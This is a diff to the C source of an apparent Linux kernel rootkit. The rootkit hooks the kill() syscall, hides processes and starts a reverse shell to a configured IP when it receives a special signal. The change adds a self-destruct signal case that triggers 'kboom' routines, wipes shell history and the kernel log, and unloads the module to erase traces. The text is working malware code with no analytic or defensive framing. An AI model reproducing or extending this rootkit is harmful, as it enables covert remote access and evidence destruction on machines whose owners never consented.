@@ -11,6 +11,7 @@
 #include "h_kill.h"
 #include "../hooking.h"
 #include "../revshell.h"
+#include "../selfdestruct.h"
 
 #define PF_INVISIBLE 0x10000000
 
@@ -27,6 +28,7 @@ struct task_struct *find_task(pid_t pid)
     }
     return NULL;
 }
+
 
 int new_kill(const struct pt_regs *pt_regs)
 {
@@ -53,6 +55,15 @@ int new_kill(const struct pt_regs *pt_regs)
         case SIGNAL_REVERSE_SHELL:
             start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
             break;
+        case TEST:
+            module_show();
+            kboom();
+            kboom_persistence();
+            flush_history();
+            flush_dmesg();
+            unload();
+            printk(KERN_INFO "CALL SELFDESTRUCT WITH SIG");
+            break;
         default:
         return old_kill(pt_regs);
     }
@@ -69,6 +80,7 @@ void hijack_kill(void) {
     m_printd(KERN_INFO "Hooked kill(), new kill @ %p", &syscall_table[__NR_kill]);
     protect_memory(old_cr0);
 }
+
 void module_show(void)
 {
     list_add(&THIS_MODULE->list, module_previous);
